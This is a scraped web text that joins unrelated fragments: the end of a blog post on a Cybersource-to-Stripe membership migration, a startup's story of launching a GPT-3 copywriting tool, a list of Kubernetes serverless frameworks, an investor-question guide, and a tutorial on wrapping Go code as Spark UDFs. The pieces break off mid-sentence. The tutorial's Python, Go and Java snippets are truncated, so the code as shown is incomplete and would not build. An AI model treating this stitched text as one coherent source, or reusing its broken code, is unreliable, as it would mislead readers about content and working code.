<p>Since the members had already paid for their memberships, the Stripe subscriptions were created with trials that ended at the next rollover point. This ensured members were not double-charged. In hindsight, I could have achieved the same result by initially setting the subscription to send an invoice (instead of charge automatically), immediately mark the invoice as paid, and updating the subscription to charge automatically. However, this extra effort would not have served much of a purpose for us since we don’t normally rely on trials. If your business model relies on trials, and you want the Stripe dashboard conversion/retention metrics to be accurate, I recommend the multi-step approach over trials.</p>

<p>The script was initially run against Stripe’s test environment, revealing a few issues I needed to resolve:</p>

<ol>
  <li><strong>Expired cards for active subscriptions.</strong> If a card expired before it could be migrated to Stripe, the script creates the subscription anyway. The member will be notified when the subscription renewal is approaching, and can update payment details before then.</li>
  <li><strong>Multi-year subscriptions.</strong> Some of our members managed to pay for multiple years of membership in advance, resulting in a need for trials that ended well into 2023. Stripe only supports trials up to two years in length. Given we had about 10-15 such memberships, I opted to resolve them manually by setting up <a href="https://stripe.com/docs/billing/subscriptions/subscription-schedules">subscription schedules</a> in the Stripe Dashboard. At the end of two years, another trial will be created for the remainder of the pre-paid period. After that time, the subscription will cycle to a paid subscription like the others.</li>
</ol>

<p>We have less than 2000 subscriptions, so the bulk of the migration was done in a few hours. I spent a few more days, off-and-on, tracking down one-off issues and re-running the scripts to migrate subscriptions that were created between my initial data download and disabling the old sign-up form. This is where I learned an interesting fact: Cybersource includes read transactions in their daily transaction logs. If you happen to load 2000 subscriptions via API one day, a record of each of the 2000 API calls will be in the transaction logs for that day. Subsequent downloads of the subscription metadata took much longer than the initial one!</p>

<p>The migration scripts are <a href="https://gitlab.com/mitcnc/Cybersource-to-stripe">available on GitLab</a>. They are still somewhat hard-coded for MITCNC purposes, but should serve as a decent starting point for others. This work is available without warranty, and is not endorsed by MIT or Stripe. As stated at the beginning of this post, make sure you understand the risks before you attempt a similar migration.</p>



<p>Some of these are just good habits. Others are mistakes I made with this migration.</p>

<p><strong>Utilize the test environment.</strong> Stripe’s test environment made it easy for me to test my code without fear accidentally charging a member. I did have to modify my script to create payment methods with the test card number, however, since the test environment does not accept real card numbers.</p>

<p>**Build a prototype/MVP. **A couple hours on a decent demo can save even more time in back-and-forth emails and meetings, and help gain support for a migration by showing stakeholders some of the benefits of the migration.</p>

<p><strong>Work with stakeholders to ensure you understand all subscription types/behaviors.</strong> This is where I messed up. I knew about the different levels, free lifetime memberships, and discounts for students. I did not know that we also offer a discount for alumni who are current students at other institutions. Modeling this is pretty straightforward, but our administrator will need to manually create these subscriptions in the Stripe dashboard until I update our plugin(s) to handle these discounts.</p>

<p><strong>Consolidate your data sources.</strong> I had a record of memberships exported from iModules to my data warehouse in BigQuery. This table included one-time payments (e.g., non-renewing membership), subscriptions, and manually-created student and lifetime memberships. I should have used this one table as my source of truth, and written a single script to migrate subscriptions. Instead I was laser focused on recurring memberships, and ended up writing one script that dealt with Cybersource subscriptions, one for lifetime memberships, and another for non-recurring memberships. Additionally, I spent a bit of time syncing user data back to WordPress <em>after</em> the migration when it should have been done first.</p>

<p>If I were to repeat this procedure, I would do the following:</p>

<ol>
  <li>Ensure all users are recorded in our authentication service—the WordPress user table.</li>
  <li>Sync the users to Stripe customers.</li>
  <li>Sync WordPress, Stripe, and iModules data to the data warehouse—BigQuery.</li>
  <li>Write a …</li></ol></div></div></div></div>

The Idea</h2><p>MagicFlow was born out of the need to build landing pages for the products we were working on.</p><p>We are solopreneurs building a few products on the side. When it came to writing copy for our landing pages, we always used to get stuck. We either had to settle with the sub-standard copy we wrote ourselves (hey we are not copywriters) or hire a copywriter, which was always an expensive option.</p><p>We wished there was a tool that could take the pain out of creating great copy for our landing pages and other content.</p><p>Coincidentally, we had been playing around with GPT-3 for a few weeks.</p><blockquote><p>GPT-3 is a state-of-the-art generative language model that can learn the patterns in text and then generate new text based on these patterns.</p></blockquote><p>It got us thinking, “can we use GPT-3 to generate landing pages from short descriptions of the product/service?“.</p><p>After a few days of tinkering with GPT-3, we were able to generate pretty good landing pages from just a few lines of input.</p><h2 id="2-the-mvp"><a href="#2-the-mvp"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>2. The MVP</h2><p>At this point, we were convinced that we were onto something.</p><p>We decided to build an MVP and test if our assumptions were correct.</p><p>Using my <a href="https://tldrthis.com/" target="_blank">previous app’s</a> boilerplate code, we were able to build an MVP within 2-3 hours. All the MVP did was to take a short description of the respective product/service as input, pass that through OpenAI’s API, parse the results from the API and replace the relevant sections in a sample landing page template.</p><p>With just a few lines of code, we were able to put together a simple MVP.</p><p>Then, we recorded a video demo of the MVP using QuickTime, added some animated text using Canva, picked up a nice non-copyrighted audio track from YouTube and put it all together using iMovie.</p><div> <p> <iframe title="" src="https://www.youtube.com/embed/CMA-ws91TWg?rel=0" allowfullscreen=""></iframe> </p> </div><p>Finally, for our landing page, we used a cool template from <a href="https://cruip.com/" target="_blank">cruip.com</a> and got the images for the page from <a href="https://undraw.co/" target="_blank">Undraw.co</a>.</p><p>We used our own MVP to generate the copy for all the sections (header, features, and CTA) of our landing page.</p><p><img src="https://images.ctfassets.net/eevty2ochusg/5xyoWJcCRZJux7dBW9CKaE/2f5443bab47285a72b2d9a1854c0f1c4/MagicFlow_Landing_Page.jpg" alt="MagicFlow Landing Page"></p><p>We also used the <a href="https://getwaitlist.com/" target="_blank">Waitlist API</a> to quickly set up a waiting list for early access to the product.</p><p>All the heavy lifting was done in just a few hours.</p><h2 id="3-the-launch-plan"><a href="#3-the-launch-plan"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>3. The Launch Plan</h2><p>The next morning, we launched on <a href="https://www.producthunt.com/posts/magic-flow" target="_blank">Product Hunt</a>.</p><p>We were super excited, but also nervous.</p><p>We were expecting high traffic on Product Hunt but had no clue whether people will like our idea or not.</p><p>Surprisingly, we were able to get our product on the features page of Product Hunt within an hour of launch.</p><p>In the next hour, we were able to get to the #1 spot.</p><p>We were ecstatic!</p><p>But then, in the next hour, the Product Hunt team told us that they are going to un-feature the product since it’s pre-launch.</p><p>We were a bit disappointed but didn’t get discouraged. We decided to continue sharing the product on more platforms.</p><p>In the next few days, we posted the product on Reddit and Twitter and got a few more signups.</p><p>Given the waitlist had gamification built-in, users could jump 5 places up the waiting list by sharing their referral link. Each user they refer to moves them 5 places up the waiting list. This helped with the initial traction.</p><p><img src="https://images.ctfassets.net/eevty2ochusg/2NLKdjbR7bmsLD9ot34u8k/c49a9fd3dffd39be48f2830dbd78ebe5/MagicFlow_Waitlist.jpg" alt="MagicFlow Waitlist"></p><p>Within one week, we were able to get 1000+ signups.</p><p>Out of these signups, about a third of them came from Product Hunt, about 200 came from Reddit and Twitter, and the remaining came from word of mouth promotion.</p><p>Overall, we are very happy with the initial traction.</p><h2 id="4-the-learnings"><a href="#4-the-learnings"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"></path></svg></a>4. The Learnings</h2><p>There are a few learnings that we want to share with you:</p><p><strong>1. Validate the idea before spending time on building the product</strong></p><p>When we decided to build MagicFlow, we had no idea if our idea had any potential.</p><p>We just knew that we needed a product that would help us write better copy for our landing pages quickly.</p><p>By spending a couple of hours on building and launching the MVP, we were able to validate the idea.</p><p><strong>2. Use tools that you are already familiar with and have a good grasp of</strong></p><p>We reused our previous app’s boilerplate code to build an MVP within 2-3 hours. Most of the tools that we used in this project were tools that we were already familiar with.</p><p>Had we chosen a relatively new, fancier set of technology, it would have taken us many days to build the MVP.</p><p><strong>3. Sign up potential users before building the product</strong></p><p>We implemented a waiting list system to attract and capture the initial user base. </p><p>These users were our first customers. We used their feedback to build the initial version of our product, iterate it and make it better.</p><p><strong>4. Post on more than one platform to increase your chances of getting traction</strong></p><p>While Product Hunt is the most popular platform, we also posted on Reddit and Twitter.</p><p>By posting on more than one platform, we were able to get a much wider reach.</p><hr><p>That’s it for this post, folks.

It offers language flexibility and supports HTTP events and can be set-up easily.</p><h2>Knative</h2><p><a href="https://knative.dev/">Knative</a> is an open source initiative that combines Kubernetes with Serverless and is largely supported by Google engineers. It provides a platform to build serverless solutions on top of Kubernetes. Knative supports autoscaling, in-cluster builds, and eventing framework for cloud-native applications on Kubernetes.</p><h2>Kubeless</h2><p><a href="https://kubeless.io/">Kubeless</a> is an open source serverless framework that supports functions and is designed to be deployed on a Kubernetes cluster. It supports Python, Node.js, Ruby, PHP, Golang, .NET, Ballerina, and custom runtimes. Triggers are supported through the Kafka messaging system and HTTP events. Monitoring is supported through Prometheus. The drawback of Kubeless is that it is not adequately represented by a developer community or documentation.</p><h2>OpenFaaS</h2><p><a href="https://docs.openfaas.com/">OpenFaas</a> a brainchild of Alex Ellis, is an open source serverless platform that supports serverless functions deployed on Docker Swarm or Kubernetes. The code can be written in any language inside the containerized functions. It is easy to set up as it offers a default configuration but is also customizable. There is no limit on runtime for functions. Since the application is containerized, it offers high portability.</p><h2>OpenWhisk</h2><p><a href="https://www.ibm.com/cloud/functions">IBM OpenWhisk</a> is based on Apache OpenWhisk and supports multiple languages like Node.js, Swift, Java, PHP, Python, and additional languages via <a href="https://thechief.io/c/editorial/ultimate-docker-cheat-sheet/">Docker</a> containers. It integrates with other services like IBM Cloudant database, IBM EventStreams, and IBM Watson APIs, which provides natural language processing and AI capabilities. Monitoring and Logging capabilities are provided through IBM Cloud Monitoring. There is no time limit on single function invocation, which makes it suitable for long-time invocation.</p><h2>Nuclio</h2><p><a href="https://nuclio.io/">Nuclio</a> is another open source serverless platform targeted at applications that require high data-processing capabilities as it supports persistent connections. It can run over Docker or Kubernetes and is portable without any vendor lock-in. It supports multiple event sources like HTTP Events, Kinesis, Kafka, Rabbit MQ etc.. and multiple log destinations.</p><h2>Fn Project</h2><p><a href="https://fnproject.io/">Fn Project</a> supported by Oracle provides a way to create and run serverless functions on Docker. They can be tested and run locally or on any cloud environment with a Docker engine. The runtime itself supports all languages, but deeper functionality is available for Java, Go, Python, and Ruby.</p><h2>IronFunctions</h2><p><a href="https://github.com/iron-io/functions">IronFunctions</a> is an open source Functions as a Service (FaaS) platform that you can run anywhere. This platform is compatible with Kubernetes, Docker Swarm, and Mesosphere. Iron is also currently hosting Functions for select customers. </p></div></section><section><div><h2>Conclusion</h2><p>Mixing Kubernetes and Serverless is taking advantage of the speed of prototyping Serverless applications and the performance offered by Kubernetes. However, each technology brings possible downsides if it is not well handled. The <a href="https://thechief.io/c/editorial/pitfalls-serverless-computing/">pitfalls of Serverless</a> and <a href="https://thechief.io/c/editorial/4-kubernetes-failure-stories-learn/">Kubernetes Failure Stories</a> can illustrate this. </p></div></section></div></div>]]>

The answer to this questions should be one that you know, and you can provide with certainty and authentic conviction. Make use of the elevator pitch, excite the investor with an engaging answer that sparks their curiosity to learn more.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why did you pick this idea to work on?</p> </div>  </div> <div> <div> <div data-id="pwj5nk" data-type="inner-row"> <div data-id="pzojfp" data-type="column"> <div data-id="pw9bdv" data-type="heading">  <div> <p>Again, keep your questions short and to the point during investor meetings. This is a great opportunity to explain your motivation as to why you are working on this. Make sure to convey clear reasons and back them up with some domain expertise or background experience that makes you the perfect team to work on this idea. don’t forget to express your enthusiasm and excitement your cary within to be bring this idea to life. Investors like to hear that you are passionate about what you do.</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="pfrdpb" data-type="inner-row"> <div data-id="p76drh" data-type="column"> <div data-id="pcqqvd" data-type="heading">  <div> <p>The investor likes to know if you can prove that you have a truly unique value proposition. You have been working on this idea for a while now and did your research, you should definitely be able to explain properly how you differ from others in the market. First of all, express how you and your team are different than any other team to execute on this. Explain the in-house expertise, motivation, and amazing team collaboration to achieve results. Second, you found a unique solution to the customer’s problem through innovative (proprietary) technology, product development, or service offering unlike anything in the market today.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What big problem do you solve?</p> </div>  </div> <div> <div> <div data-id="p5m277" data-type="inner-row"> <div data-id="p729kq" data-type="column"> <div data-id="pwq1v6" data-type="heading">  <div> <p>When an investor asks you this question, get ready to emphasize clearly that the problem your solving is HUGE! You are on a mission to solve a problem that will change the way people do certain things and it will have a tremendous impact. Make sure to state some short key facts why this true so you’re not just blowing this up. The reason why you want to answer it in this way, is because the bigger the problem, the more likely people are willing to pay.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What is unique about the company?</p> </div>  </div> <div> <div> <div data-id="pswh74" data-type="inner-row"> <div data-id="pt3l1o" data-type="column"> <div data-id="prc0cw" data-type="heading">  <div> <p>Although this question ties in closely with “how are you different?” they are not entirely the same question. This is your opportunity to really focus on what makes your company unique. It might be your proprietary innovative technology that makes your company unique. It could be that your team has amazing set of skills unlike any other team. Or, it could be that your company strategized towards problems and opportunities just a bit different than others. Focus, focus, focus – let them know that <i>you know</i> what is unique about your company.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Why is your business defensible?</p> </div>  </div> <div> <div> <div data-id="pc026o" data-type="inner-row"> <div data-id="pg1ie5" data-type="column"> <div data-id="pf29xp" data-type="heading">  <div> <p>The investor is looking for some reassurance that your business and product/service is not one that will be copied easily. You defensibility could be your go-to-market strategy or scaling strategy. Defensibility could also come from the team you assemble or the technology you are building. Explain how your business is one that can’t be easily copied and executed. Even if the idea can be copied by another company, they will not have the team you have to execute successfully. There is and should always be a clear confident answer to this question.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What do you understand that others don’t?</p> </div>  </div> <div> <div> <div data-id="p4hpcs" data-type="inner-row"> <div data-id="pu9ezu" data-type="column"> <div data-id="pnji6p" data-type="heading">  <div> <p>You certainly did your market research, spoke to customers, or have a background in a certain industry or field that gave you an understanding of the problem or opportunity you are working on. Hone in on all of them and incorporate them into the core of your story as to why you understand what other’s do not.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Who do you want to be like?</p> </div>  </div> <div> <div> <div data-id="pyb2yg" data-type="inner-row"> <div data-id="peb0i8" data-type="column"> <div data-id="p41xv8" data-type="heading">  <div> <p>You don’t want to be like anyone else. You’re unique, different, and will do things better. However, this is great moment to give an example of a company you admire (wether in your field or not). It shows that you have a vision for a certain strategy, company culture, or execution. While explaining your likes about the other company, make sure to incorporate some clear examples of what you will adopt and do differently.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Who do you least want to be like?</p> </div>  </div> <div> <div> <div data-id="p11f39" data-type="inner-row"> <div data-id="pvu318" data-type="column"> <div data-id="pdd7ly" data-type="heading"> <div> <p>Don’t answer this question by badmouthing another company. Answer short and concise, you are not focussing on who you don’t want to be, you’re focussing on who you are going to be – a company destined for greatness.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Where are you headquartered?</p> </div>  </div> <div> <div> <div data-id="p3kubm" data-type="inner-row"> <div data-id="p9os0u" data-type="column"> <div data-id="p0x5r5" data-type="heading"> <div> <p>Are company is headquartered in [insert city, country state].</p> </div> </div> </div> </div> </div> </div> </div> <div>  <div> <div> <div data-id="pcex4u" data-type="inner-row"> <div data-id="pc6fbv" data-type="column"> <div data-id="p5j103" data-type="heading">  <div> <p>The answer is either <i>Yes</i>, or, <i>No</i>. If you’re profitable you share an exact figure of profit you made. If you’re not profitable, don’t turn this answer into a defensive statement as to why not. Instead, give a short answer as to when you expect to become profitable and why (letters of intent, speaking with clients that will convert soon etc…). However, do not lie or give vague answers as to when you expect profits. This will only complicate things later and will make you look like you failed when you don’t reach those conversions. It’s okay to mention some positive expectations, but, try to stay realistic.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How do you define success for you and your company?</p> </div>  </div> <div> <div> <div data-id="pc94f2" data-type="inner-row"> <div data-id="pt4kbo" data-type="column"> <div data-id="pxdwlf" data-type="heading">  <div> <p>Investors want to invest in founders who are focused on a disruptive, game-changing products/services/ideas. Some founders are more than happy to exit early and cash-in. Other founders want to push their business to the absolute limit and become the next Bill Gates, Steven Jobs, or Elon Musk. Make sure to think about this question carefully before answering. You should know your vision and dream – don’t be afraid to dream big (but stay realistic).</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What’s an impressive thing you have done?</p> </div>  </div> <div> <div> <div data-id="pw0fvu" data-type="inner-row"> <div data-id="pr3ptt" data-type="column"> <div data-id="puyuef" data-type="heading">  <div> <p>Use this as an opportunity to hone in on an achievement that that may wow the investor.

We all make mistakes, we live, and we learn. Use this as an opportunity to explain how lessons learned were translated into actions. Maybe you had a hit and miss with a product feature or communication failure with a client. Give a clear short example of what happened, how you overcame the “worst thing”, and put those learnings back into your team, product, or management.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>How is the company currently organized?</p> </div>  </div> <div> <div> <div data-id="p46rih" data-type="inner-row"> <div data-id="pa7sei" data-type="column"> <div data-id="pn11t5" data-type="heading">  <div> <p>Do you have a corporate pyramid hierarchy? Or are you running your business a bit more flat? This should be a simple answer in which you explain the structure of your management, team, and/or advisors. Maybe you can even give a short example of how communication works in the company and the culture of collaboration. Don’t forget to mention how decisions are made, who is involved in the decision making process, and why you chose this approach. Finally, are you all working from the same office or do you have a remote team. Simply give a short summary of how your company is organized.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>What does the cap-table look like?</p> </div>  </div> <div> <div> <div data-id="pyxv9z" data-type="inner-row"> <div data-id="p5ncod" data-type="column"> <div data-id="pso2hl" data-type="heading">  <div> <p>The cleaner the better.

You can always return the question to the investor and ask <i>We have not yet discussed that option internally, but why do you ask?</i>. If the response is “we only invest in companies incorporated in [insert country]” – your follow-up question should be <i> if I hear your correctly, you would be willing to invest in our startup if we are located in [insert country]?</i>. Always confirm if that would tick of one of the criteria boxes.</p> </div> </div> </div> </div> </div> </div> </div> <div> <div> <div> <p>Is there an existing board or advisors?</p> </div>  </div> <div> <div> <div data-id="ppl5nu" data-type="inner-row"> <div data-id="p326r8" data-type="column"> <div data-id="p2f2of" data-type="heading"> <div> <p>Pre-seed or seed funded companies often do not have a board.

<p>Apache Spark is a perfect fit for processing large amounts of data. It’s not,&nbsp;
however, a perfect fit for our language stack at
<a href="https://community.com/">Community</a>. We are largely an Elixir shop with a solid
amount of Go, while Spark’s native stack is Scala but also has a Python API.
We’re not JVM people so we use the Python API—via the Databricks platform. For
most of our work, that’s just fine. But, what happens when you want to write a
custom user defined function (UDF) to do some heavy lifting? We could write new
code in Python, or… we could use our existing Go libraries to do the job! This
means we have to wrap up our Go code into a jar file that can be loaded into the
classpath for the Spark job. This is how to do that.</p>

<p>(Note that everything below could equally apply to UDAFs—aggregate functions)</p>

<h2 id="why-did-you-do-this-crazy-thing">Why Did You Do This Crazy Thing?</h2>

<p>You might be wondering how well this works. To put that issue to rest: it works
well and has been effective for us. That being established, let’s talk about
our use case. We have a large amount of data stored in a binary container
format that wraps Protobuf records, stored on AWS S3. Spark is great with S3,
but cannot natively read these files. Complicating things further, schemas for
the Protobuf records need to be kept up to date for all the tools that process
this data in anything but the most trivial way.</p>

<p>Over time we have built a set of battle-tested Go libraries that work on this
data. Furthermore, we already maintain tooling to keep the Protobuf schemas and
Go libraries up to date. It seems natural to leverage all of that goodness in
our Spark jobs:</p>

<ol>
  <li>Battle-tested libs that have been in production for awhile, with good tests.</li>
  <li>We already manage pipelines to keep the schemas up to date for the Go libs.</li>
</ol>

<p>Given the tradeoffs of reimplementing those libraries and the CI jobs, or
wrapping Go code up into jar files for use as Spark UDFs, we did the sane
thing!</p>

<h2 id="spark-udfs">Spark UDFs</h2>

<p>Spark is flexible and you can customize your jobs to handle just about any
scenario. One of the most re-useable ways to work with data in Spark is <a href="https://jaceklaskowski.gitbooks.io/mastering-spark-sql/content/spark-sql-udfs.html">user
defined functions
(UDFs)</a>.
These can be called directly inside Spark jobs or Spark SQL. In our case we use
a UDF to transform our custom binary input and Protobuf into something that
Spark more easily understands: JSON.</p>

<p>This means we can do something like this:</p>

<figure><pre><code data-lang="python"><span></span><span>import</span> <span>pyspark.sql.functions</span> <span>as</span> <span>F</span>

<span>)</span>

<span># Continue working with the dataframe</span></code></pre></figure>

<p>By transforming the data into JSON, we get to work on something that is much
more native to Spark than Protobuf. Because we use the libraries that are
already maintained with up to date bindings, we don’t have to manage that
inside Spark itself. We only have to update our UDF in the jar loaded by the
job.</p>

<h2 id="building-a-spark-udf-in-go">Building a Spark UDF in Go</h2>

<p>Before we look too hard at anything else we need to get Go code into a wrapper that
lets us call it from Java. Then we’ll need to write a little Java glue to wrap
the Go code into the right types to make Spark happy when calling it. Luckily,
for this use case it’s all pretty simple.</p>

<h3 id="wrapping-go-code-into-a-java-library">Wrapping Go Code Into a Java Library</h3>

<p>First, we need some Go code to wrap. The library we talked about was built for
one purpose, but we need a little wrapper function to do just the part we need
to call from Spark. In our case we’ll take a single value from Spark and return
a single value back. Both of those values will be of type <code>[]byte</code> which makes
things really simple going between Go and Java, where this type interchanges
easily. I made a file called <code>spark_udf.go</code> that looks like this:</p>

<figure><pre><code data-lang="go"><span></span><span>package</span> <span>eventdecoder</span>

<span>import</span> <span>(</span>
        <span>"bytes"</span>
        <span>"compress/gzip"</span>
        <span>"io/ioutil"</span>

        <span>"github.com/company/yourlib"</span>
<span>)</span>

                <span>// We return an error as the body!</span>
                <span>return</span> <span>[]</span><span>byte</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
        <span>}</span>

        <span>if</span> <span>err</span> <span>!=</span> <span>nil</span> <span>{</span>
                <span>// We return an error as the body!</span>
                <span>return</span> <span>[]</span><span>byte</span><span>(</span><span>err</span><span>.</span><span>Error</span><span>())</span>
        <span>}</span>

        <span>output</span><span>,</span> <span>_</span><span>,</span> <span>_</span><span>,</span> <span>err</span> <span>:=</span> <span>yourlib</span><span>.</span><span>DoSomeWork</span><span>(</span><span>uncompressedData</span><span>)</span> 

        <span>// Handle errors, etc</span>

        <span>return</span> <span>bytes</span><span>.</span><span>Join</span><span>(</span><span>output</span><span>,</span> <span>[]</span><span>byte</span><span>(</span><span>"\n"</span><span>))</span>
<span>}</span></code></pre></figure>

<p>Now that we have that, we need to get it into a jar file with all the bindings
that will let Java call into the Go function. As part of the <code>gomobile</code> efforts
to integrate Go with Android, there are some tools that will handle two way
wrappers between Java and Go.
<a href="https://godoc.org/golang.org/x/mobile/cmd/gobind"><code>gobind</code></a> will generate Java
bindings for exported functions in a Go module. You could start there and build
up the necessary tools to make this work. Sadly, it’s not at all trivial to get
it into a shape that will build nicely.</p>

<p>After messing around with it for awhile, I found a tool called
<a href="https://github.com/sridharv/gojava"><code>gojava</code></a> that wraps all the hard parts
from gobind into a single, easy to use tool. It’s not perfect: it does not
appear to be under active development, and does not support Go modules. But, it
makes life so much easier, and because none of this stuff changes that often,
the lack of active development isn’t much of a hindrance here. The ease of use
makes it worth it for us. Getting a working Java jar file is a single step:</p>

<figure><pre><code data-lang="shell"><span></span><span>JAVA_HOME</span><span>=</span>&lt;your_java_home&gt; <span>\</span>
        <span>GO111MODULE</span><span>=</span>off <span>\</span>
        gojava -v -o <span>`</span><span>pwd</span><span>`</span>/eventdecoder.jar build github.com/&lt;your_module_path&gt;</code></pre></figure>

<p>This will generate a file called <code>eventdecoder.jar</code> that contains your Go code
and the Java wrappers to call it. Great, right? If you are using Go modules,
just use <code>go mod vendor</code> before running <code>gojava</code> to make sure that you have all
your dependencies in a form that <code>gojava</code> can handle.</p>

<h3 id="adding-the-right-interface">Adding the Right Interface</h3>

<p>But we are not done yet. The Go code in the jar we built does not have the
right interface for a Spark UDF. So we need a little code to wrap it. You could
do this in Scala, but for us Java is more accessible, so I used that. Spark
UDFs can take up to 22 arguments and there are different interfaces defined for
each set of arguments, named <code>UDF1</code> through <code>UDF22</code>. In our case we only want
one input: the raw binary. So that means we’ll use the <code>UDF1</code> interface. Here’s
what the Java wrapper looks like:</p>

<figure><pre><code data-lang="java"><span></span><span>package</span> <span>com.community.EventsUDF</span><span>;</span>
<span>import</span> <span>org.apache.spark.sql.api.java.UDF1</span><span>;</span>

<p>We stick that in our path following the expected Java layout. So if
<code>spark_udf.go</code> is in the current directory, below it we put the above files in
<code>java/com/community/EventsUDF/Decoder.java</code>. Note that this needs to match your
package name inside the Java source file.</p>

<h3 id="assembling-it">Assembling It</h3>

<p>We’re almost there! But, we need the Spark jar files that we’ll compile this
against. Our project has a <code>Makefile</code> (which I’ll share at the end of this
post) that downloads the correct jars and sticks them in <code>./spark_jars</code>. With
those being present, we can compile the Java code:</p>

<figure><pre><code data-lang="shell"><span></span>javac -cp <span>\</span>
	spark_jars/spark-core_<span>$(</span>VERSION<span>)</span>.jar:eventdecoder.jar:spark_jars/spark-sql_<span>$(</span>VERSION<span>)</span>.jar <span>\</span>
	java/com/community/EventsUDF/Decoder.java</code></pre></figure>

<p>With that compiled we can just add it to our Jar file and we’re ready to go!</p>

